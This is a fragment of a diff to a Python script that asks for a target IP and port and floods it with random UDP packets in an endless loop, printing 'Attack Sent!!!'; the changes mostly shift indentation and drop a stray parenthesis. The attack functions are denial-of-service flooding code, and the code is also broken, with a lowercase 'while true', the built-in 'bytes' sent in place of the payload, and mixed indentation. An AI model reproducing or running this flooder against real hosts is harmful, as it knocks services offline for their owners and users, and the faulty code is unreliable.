@@ -59,7 +59,6 @@ while attemps < 100:
         continue
 os.system("clear")
 
-(
 
 ip = str(input("\033[96m Target IP : \033[0m"))
 port = int(input("\033[92m Target Port : \033[0m"))
@@ -81,14 +80,14 @@ def run():
 
 def run2():
 	data = random._urandom(20000)
-   i = random.choice(("[+]"))
-   while true:
+        i = random.choice(("[+]"))
+        while true:
 		try:
-       s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-      s.sendto(bytes, (ip,port))
-    print(i +"Attack Sent!!!")
+                         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                         s.sendto(bytes, (ip,port))
+                         print(i +"Attack Sent!!!")
 		 except:
-			print("[!] Error!!!")
+			 print("[!] Error!!!")
 
 def run3():
 	data = random._urandom(999)
